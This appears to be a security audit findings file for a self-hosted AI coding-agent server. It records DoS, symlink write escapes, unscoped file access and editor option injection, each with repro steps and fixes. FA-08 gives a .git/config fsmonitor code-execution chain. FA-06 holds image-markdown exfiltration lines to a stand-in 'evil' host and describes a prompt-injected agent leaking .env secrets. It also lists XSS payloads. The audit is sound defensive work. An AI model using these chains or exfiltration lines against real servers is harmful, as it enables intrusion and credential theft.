# FINDINGS (FA-)

## FA-01 P1 (reliability/DoS) projects.readFile on a FIFO blocks a libuv thread forever; 4+ calls freeze the whole server

- Repro (RUN): project dir with `mkfifo fifo`. Send 5x WS RPC `projects.readFile {cwd:<proj>, relativePath:"fifo"}` (scripts: rt-d/t3.mjs). After that `GET /` and every other fs-backed RPC (readFile a.txt, static files) time out. Server only recovered after a writer was opened on the FIFO (`exec 3>proj/fifo`).
- Expected: reject non-regular files before open (lstat/stat first, or open with O_NONBLOCK), return path_not_file. Actual: `NodeFSP.open(realTargetPath,"r")` happens BEFORE the `stat.isFile()` check, so open() on a FIFO blocks a threadpool worker (default 4).
- Code: apps/server/src/workspace/WorkspaceFileSystem.ts readFile, acquireUseRelease open at ~L170, isFile check at ~L196 (after open).
- Exploitability: needs a FIFO inside a project dir (git repos can contain one only if created by tooling; an agent or script can `mkfifo`) or via cwd pointing at any dir (see FA-02) combined with no auth (S06). A single unauthenticated page/cross-origin WS caller can freeze the server with 5 messages if any FIFO path is known/creatable (writeFile cannot create FIFOs, but terminal can). Home server: low-medium, trivial one-off, but it freezes the UI and all threads until restart.

## FA-02 P2 (security) cwd of readFile/writeFile/search/list is any directory, not a registered project root

- Repro (RUN): `projects.readFile {cwd:"/etc", relativePath:"hosts"}` returns contents; `cwd:<rt-d/secret>` returns "TOP SECRET". Server never checks cwd against the project registry (ws.ts ~L2142-2186 passes input straight to WorkspaceFileSystem/WorkspaceEntries; WorkspacePaths.normalizeWorkspaceRoot only checks it is a directory).
- Expected: cwd must be a registered project / thread worktree root. Actual: any text file on the host (<=1MB, non-binary) readable and any path writable (see FA-03) via RPC alone. Combined with S06 (no token) any origin that can reach the port gets host file read/write without needing the terminal RPC. Also `~` is NOT expanded for cwd in readFile (resolves to <server cwd>/~) while filesystem.browse and normalizeWorkspaceRoot do expand it: inconsistent.
- Context: a tokenless terminal.open/write is already S06, so this is mainly defence in depth once a token exists (token holder can already shell out), and it matters for the "target machine pinned" model if file RPCs are meant to be project-scoped.

## FA-03 P1 (security, containment) projects.writeFile follows symlinks and creates directories through them: write outside project root

- Repro (RUN, rt-d/t4.mjs): project proj/ contains `linkfile -> ../secret/s.txt`, `linkdir -> ../secret`, `sub/up -> ../../secret`. `projects.writeFile {cwd:proj, relativePath:"linkfile", contents:"X"}` overwrote secret/s.txt (outside root). `relativePath:"linkdir/new.txt"` created secret/new.txt. `relativePath:"sub/up/deep/x/new2.txt"` created secret/deep/x/new2.txt (mkdir -p through the link). Lexical `../` and absolute paths are rejected, readFile realpath-checks and rejects the same links, so the write path is simply missing the check.
- Expected: same realpath containment as readFile (and O_NOFOLLOW / realpath of deepest existing ancestor). Actual: lexical check only.
- Code: apps/server/src/workspace/WorkspaceFileSystem.ts writeFile (~L225-262): resolveRelativePathWithinRoot then makeDirectory(recursive)+writeFileString, no realpath check. WorkspacePaths.resolveRelativePathWithinRoot is purely lexical.
- Exploitability: a cloned repo or an agent can plant a symlink (git stores symlinks; `ln -s ~/.ssh ssh` or `ln -s ~ h`). Any later write through the file editor/RPC, or an attacker who can reach the RPC (S06), then writes e.g. `h/.ssh/authorized_keys`, `h/.zshrc`, `h/.config/...` with the neokod user's rights. Without S06 it needs a user to save a file via a symlinked path in the editor, so medium; with S06 it is the same as shell access anyway (terminal RPC). Home-server realistic scenario: malicious repo with committed symlink + agent edit/save in file panel.

## FA-04 P1 (data loss) writeFile is non-atomic, lossy for non-UTF-8, strips BOM, no revision check, and truncated reads can be written back

- Repro (RUN, t4.mjs, t6.mjs):
  a) Non-atomic: `writeFileString` truncates in place. During a 40MB write a concurrent reader saw an EMPTY file in 760 of 1501 polls. Crash/kill/ENOSPC mid-write leaves empty or partial files. atomicWrite.ts exists (used by settings and keybindings) but is not used here. Also mode/symlink: because it writes in place, mode is preserved (755 stayed 755) and symlinks are followed (see FA-03); an atomic rename implementation must keep both.
  b) Lossy encoding: readFile decodes with `new TextDecoder("utf-8")` (replacement chars). Latin-1 file `caf\xe9 \xff\n` read then written back becomes `63 61 66 ef bf bd 20 ef bf bd 0a` (bytes silently replaced by U+FFFD). Invalid UTF-8 / binary without NUL (bin.dat = ff fe 41 80) is returned as "contents" with no flag, so editors will happily save it back corrupted. Only files with a NUL in the first 1MB are rejected.
  c) BOM stripped: file `\ufeffline1\r\nline2\r\n` read+written back loses the BOM (TextDecoder default ignoreBOM=false). CRLF preserved.
  d) Truncation: a 1MB+8 byte file returns `truncated:true` with 1048576 chars; writing those contents back (client has no guard in the API) truncated the file on disk from 1048584 to 1048576 bytes. Truncation at a multibyte boundary yields a trailing U+FFFD (mb.txt: "A\ufffd"), which would then be persisted.
  e) No expected-revision / mtime / hash on write (known U-02), so two writers last-write-wins silently. Two concurrent writes of 40MB and 30MB both returned Success; no conflict signalling.
  f) No server-side size limit: 50MB write accepted in 395ms (RSS grows); 100MB frame is rejected by the WS layer with close code 1009 and the client sees only a dropped socket (no RPC error) after a 40s timeout.
- Expected: temp file + rename in same dir preserving mode, reject or flag non-round-trippable content (return `encoding`/`lossy`), refuse writes of truncated reads, optional expectedMtime/etag, explicit max size with a typed error.
- Code: WorkspaceFileSystem.ts readFile ~L205-215 (TextDecoder, truncation) and writeFile ~L245 (writeFileString); atomicWrite.ts unused here.
- Evidence class RUN.

## FA-05 P3 (hardening) assets and app responses lack security headers; HTML/SVG/PDF assets are served inline from the app origin

- RUN: `GET /` and static files: no Content-Security-Policy, no X-Frame-Options/frame-ancestors, no X-Content-Type-Options, no Referrer-Policy, `access-control-allow-origin: *` on every route including the HTML shell. Static files have no ETag/Cache-Control (read whole into memory with readFile, http.ts staticAndDevRouteLayer ~L205-250).
- /api/assets/<token>/x.html returned `content-type: text/html` with no CSP/sandbox and no Content-Disposition; x.svg returns `image/svg+xml` (scripts run when navigated top-level). Assets are same-origin with the app and /ws, so any script in a project HTML file that is opened by navigation gets full tokenless RPC (S06) or, once a token exists, localStorage access. In the desktop build the preview is an Electron webview; in web (`neokod serve`) the UI has no navigate-to-asset path (images only via <img>), so exploitation needs the user to open the asset URL directly. Token is a signed bearer URL (1h TTL); `kind=workspace-file` tokens cover the whole dir (`baseRelativePath`) for .js/.css/.html/fonts/etc.
- No Range support: `Range: bytes=0-9` returns 200 with the full 3,000,000 bytes; `If-None-Match` with the served ETag returns 200 not 304. `Cache-Control: private, max-age=3600` means an edited preview HTML/PNG is served stale for up to an hour unless the URL (token, new on each createUrl) changes.
- Code: apps/server/src/http.ts assetRouteLayer (~L150-180): HttpServerResponse.file with only Cache-Control and nosniff. Suggested: `Content-Security-Policy: sandbox; default-src 'none'` (or sandbox without allow-same-origin) for html/svg/pdf, `Content-Disposition: attachment` for svg unless embedded as img, X-Frame-Options.
- Static traversal probes (`..%2f`, `%2e%2e`, `%00`, `//etc/passwd`, `\` variants) all safe: either 400 or SPA index fallback. Asset path traversal (`..%2fsecret`, symlinked css, dotfiles) all 404. Attachment id traversal rejected by createUrl. SPA fallback returns index.html with 200 for any unknown path including `/assets/missing.js` and `/api/anything` (P3: masks 404s, wrong content type for JS imports).

## FA-06 P2 (privacy/exfiltration) chat markdown auto-loads remote images and sends every link host to Google favicon services

- Repro (RUN, rt-d/b2.mjs b3.mjs, Playwright against the built web client): injected an assistant message (rows added to orchestration_events and replayed by projectors) and a user message containing `![x](https://evil.example/leak?q=1)` and `![remote](http://127.0.0.1:14799/pixel?leak=SECRET_FROM_CONTEXT)`. On opening the thread the browser immediately issued both requests (sink log: `GET /pixel?leak=SECRET_FROM_CONTEXT ref=http://127.0.0.1:14792/`). Plain links `[a](https://secret-internal.corp.example/path?token=abc)` and a bare URL caused `GET https://www.google.com/s2/favicons?domain=secret-internal.corp.example` and a `t3.gstatic.com/faviconV2?...url=http://secret-internal.corp.example` request (the hostname leaves the machine to Google even though the link is never clicked).
- Expected: remote images blocked or click-to-load, no third party favicon lookups for a local-first app; a prompt-injected agent can otherwise exfiltrate anything it can read (`![](https://evil/?d=<base64 of .env>)`) with zero user action, and a CSP `img-src 'self' data: blob:` would stop it.
- Code: apps/web/src/components/ChatMarkdown.tsx: CHAT_MARKDOWN_SANITIZE_SCHEMA (L153-165) extends rehype-sanitize defaultSchema which allows `img src=http(s)`; no `img` component override; MarkdownLinkFavicon (~L828-845) hardcodes google.com/s2/favicons. Server sends no CSP (FA-05).
- Real-world: single user home server: the exfil request comes from the user's browser (Tailscale client), so it goes straight to the internet; Authelia does not matter. Prompt injection via repo content or web fetch in an agent turn is the realistic trigger. Severity P2.
- Script execution: NO XSS found. Payloads that did not execute or exfiltrate: `<img onerror>` (src kept as `x`, handler stripped), `<script>`, `<iframe src=javascript:>`, `javascript:`/`JaVaScript:`/entity-encoded `&#106;avascript:`/`data:` links (href dropped), `<svg onload>`, `<form action>` (form removed, input disabled), `<style>` (rendered as text), `<link>/<meta refresh>/<base>/<video>` (stripped), inline `style=` (stripped), `<details ontoggle>` (handler stripped), id/name clobbering (prefixed `user-content-`), shiki code fence language `"><img onerror>` (escaped), mermaid fence (rendered as plain code, no mermaid plugin), activity summary/tool payload/error text with HTML (rendered as text). No dialogs, no window.\_\_xss\* flags, no pageerror.
- Minor: link opens with target=\_blank rel=noopener noreferrer (good). `file:` links and absolute paths in agent markdown become clickable chips that open the editor on arbitrary paths (e.g. /etc/hosts reached the editor launcher on one click, no confirmation, outside the project): P3.

## FA-07 P2 (security) shell.openInEditor passes an unvalidated string as an editor CLI argument: option injection

- Repro (RUN): put a fake `code` first on the server PATH; call WS RPC `shell.openInEditor {cwd:"--install-extension=evil.ext", editor:"vscode"}` -> Success; the fake binary received argv `--install-extension=evil.ext` (file fakebin/code.args). Also `cwd` need not be inside any project.
- Expected: cwd validated against registered workspace/worktree roots (and a leading `-` rejected / `--` terminator, or path made absolute), Actual: `resolveCommandEditorArgs` for launchStyle "direct-path" and "goto" (without :line:col) returns `[target]`, line-column editors return `[target]`. Real editor CLIs interpret `--install-extension=...`, `--user-data-dir=...`, `--extensions-dir=...`, `--inspect-extensions=...`, `--remote`, JetBrains `--help` etc. `file-manager` on Linux runs `xdg-open <anything>` (URLs, .desktop files).
- Code: apps/server/src/process/externalLauncher.ts resolveCommandEditorArgs L125-150, resolveEditorLaunch L335-360; ws.ts shell.openInEditor handler passes input straight through.
- Exploitability: needs RPC access (S06 today, token later) and a `code`/`cursor` CLI on the server (common on dev boxes via remote-ssh installs). Marketplace extension install on the server is a code execution path outside the terminal. Severity P2 (adds a second, non-obvious exec path, and bypasses any future terminal-only policy).

## FA-08 P2 (security chain) file write alone gives code execution: .git/config is writable and the server's own git polling runs core.fsmonitor

- Repro (RUN, rt-d/t14.mjs): `projects.writeFile {cwd:<proj>, relativePath:".git/config", contents:<config + "[core]\n\tfsmonitor = <script>">}` then the server's normal `vcs.refreshStatus`/status polling ran `<script> 2 <token>` as the server user within ~1s (marker file rt-d/exec-marker.txt: `EXEC argv=2 1791144136019875000 uid=501 cwd=.../proj`). No exec bit needed (git invokes the hook path from config), so the "no chmod via API" limitation does not help. Same class: core.hooksPath, core.sshCommand, diff.external, alias._, credential.helper, `.husky/_`and`package.json`scripts,`~/.zshrc`, `~/.ssh/authorized_keys` (with FA-02 cwd=~: fakehome/.ssh/authorized_keys and .zshrc were created, dir 0755 file 0644).
- Also a second exec path without the terminal: `server.updateSettings {providers:{codex:{enabled:true,binaryPath:"<script>"}}}` made the server execute `<script> app-server` (twice, on settings change and `server.refreshProviders`), uid 501 (rt-d/t12.mjs). `providers.claudeAgent.launchArgs` is a free string too. And `project.meta.update scripts[].command` with `runOnWorktreeCreate` runs in a terminal on worktree creation (ProjectSetupScriptRunner.ts L127-165). Plus FA-07 editor option injection.
- Expected: deny writes under `.git/` (and other control paths) in the generic file API; validate binaryPath against an allowlist / require explicit confirm; run server-side git with `-c core.fsmonitor=false -c core.hooksPath=/dev/null` (or `GIT_CONFIG_NOSYSTEM`, `core.fsmonitor=false`) for background polling.
- What an HTML page could chain (S06 assumed): cross-origin WebSocket to /ws is accepted without Origin check (S06), so a page can: readFile any text file (FA-02, e.g. ~/.ssh/config, ~/.aws/credentials, .env), exfiltrate via fetch to its own origin, write `.git/config`/`.zshrc`/authorized_keys, set provider binaryPath, launch editor with option injection, open terminals, all with no terminal RPC needed. Not repeating S06 itself.

## FA-05 addendum (RUN evidence for same-origin HTML asset)

- proj/site/x.html containing `new WebSocket('ws://'+location.host+'/ws')` + `projects.readFile {cwd:"/etc",relativePath:"hosts"}`, minted via assets.createUrl and opened top-level in Chromium: origin `http://127.0.0.1:14792`, title became `GOT {"_tag":"Exit",...,"value":{"relativePath":...}}`. So any HTML/SVG a project contains (cloned repo, agent output, uploaded SVG attachment with an `image/svg+xml` mime) executes with the app origin if its asset URL is navigated to. rt-d/b4.mjs.
- SVG attachments: Normalizer.ts accepts any `image/*` mime and stores raw bytes with the extension implied by the claimed mime (`.svg`), without content checks; served `image/svg+xml` from the asset route with no CSP.

## FA-09 P2 (DoS/log flooding) unauthenticated-style OTLP proxy route has no body size limit and logs request bodies

- Repro (RUN): `POST /api/observability/v1/traces` with a 300MB body: server RSS 50MB -> 831MB (whole body buffered by `request.json`, http.ts L100-110), returned 400. With a valid-JSON 5MB garbage body: 204, and `server.log` (stdout, no rotation) gained ~22KB containing the body text and `secret: 'LEAKME'` from the payload (`Effect.logWarning("Failed to decode browser OTLP traces", {cause, bodyJson})`, http.ts ~L112-121). Repeated posts fill the log disk; CORS answers `access-control-allow-origin: *` and preflight allows content-type, so any web page can do this to a reachable server.
- Route only runs `wslBearerAuth.authorizeHttpRequest` (no general token requirement), so this is reachable without S06's WS path. Expected: cap body (e.g. 1MB) before parsing, do not log bodies, rate limit. Severity P2 for an exposed home server (memory spike per request), P3 on loopback.

## FA-10 P3 misc (RUN unless noted)

1. File modes: only `secrets/` is 0700 and `*.bin` 0600 (good, stored by ServerSecretStore with chmod, atomic rename). Everything else is umask-default: base dir 0755, userdata 0755, `state.sqlite*` 0644 (all prompts, tool output, thread history), `settings.json` 0644, `attachments/*` 0644 (user images), `logs/server.trace.ndjson*` 0644, `server-runtime.json` 0644 (pid/port). On a shared host other local users can read all conversations. Fix: chmod 0700 on base dir/userdata, 0600 on files (settings.json via atomicWrite, sqlite).
2. Trace log (`logs/server.trace.ndjson`, 0644) records `url.full` of every HTTP request including signed asset URLs (`/api/assets/<payload>.<sig>/x.html`), which are bearer capabilities valid 1h and contain the absolute workspace root; also `externalLauncher.cwd` and `git.cwd`. No prompts, no file contents, no tracker/GH secrets were found in logs (grep of GHSECRET123, TOP SECRET, message text: none). Provider failure activity payload includes a full JS stack trace with absolute server install paths (`file:///Users/kamogelo/Code/t3code/apps/server/dist/bin.mjs:40875`) delivered to the UI (thread activity `provider.turn.start.failed`).
3. Settings: tracker credentials redacted in getSettings/getConfig/subscribe (credentialRedacted:true, value in secrets/tracker-<b64>-credential.bin 0600) good; secret file names are base64url so no traversal. But `analytics.posthogApiKey` and `observability.otlpTracesUrl` are stored plaintext in settings.json (0644) and echoed to clients; an OTLP URL commonly embeds credentials. Settings mutations use expectedRevision (stale revision correctly rejected) and keybindings upserts are serialized (20 concurrent upserts -> 20 persisted).
4. Input validation failures on dispatchCommand/upsertKeybinding surface as `Die` defects ("Missing key at [message][attachments][0][sizeBytes]", "Expected ... got \"xxxx...\"" echoing the offending value), not typed errors.
5. Project roots: `project.create` accepted `/`, `~` and `<base>/userdata/secrets` as workspaceRoot with no warning. The search index is created with `enableFsRootScanning/enableHomeDirScanning` (WorkspaceSearchIndex.ts createFinder) and a `/` search hit the 15s scan timeout; server CPU stayed 50-190% for ~2 minutes afterwards (rt-d, ps samples). Symlinks are not indexed (good: linkfile/linkdir/hosts absent from list/search). filesystem.browse lists directory NAMES only (dirs only, hidden dirs when path ends with `/`, EACCES silently empty, symlinked dirs omitted), no stat or contents; `cwd` relative base is not checked against projects.
6. `subscribeDiscoveredLocalServers` returns every listening TCP port on the host with process name and pid (docker, ControlCenter, node...): host reconnaissance for any RPC caller.
7. `preview.open` accepts any http(s) URL incl. `http://169.254.169.254/` and `http://user:pw@host/` and creates tabs for nonexistent threads. javascript:, data:, file:, chrome:, blob:, view-source: are rejected. No server-side fetch/proxy exists (preview Manager only tracks tab state), so no SSRF from the server.
8. Static handler reads every file fully with `readFile` (no streaming, no ETag/Cache-Control) and `HttpServerResponse.file` for assets has no Range or 304 handling. Asset tokens are not revocable (single signing key `asset-access-signing-key.bin`, never rotated, 1h TTL).
9. Attachments: ids are server generated `<thread-slug>-<uuid>`; `resolveAttachmentPathById` rejects `/`, `.`, `..`; client-supplied attachment `name` (e.g. `../../evil.svg`) is only metadata, the on-disk name derives from id+extension. Attachment files are removed when the thread is deleted (verified).
10. Daily-use hazard: `Analytics is enabled by default` toast appears on first load of a local-first build (sends usage data and error logs). Not network-verified in this run (no outbound PostHog request was observed from the browser; server-side egress not tested).
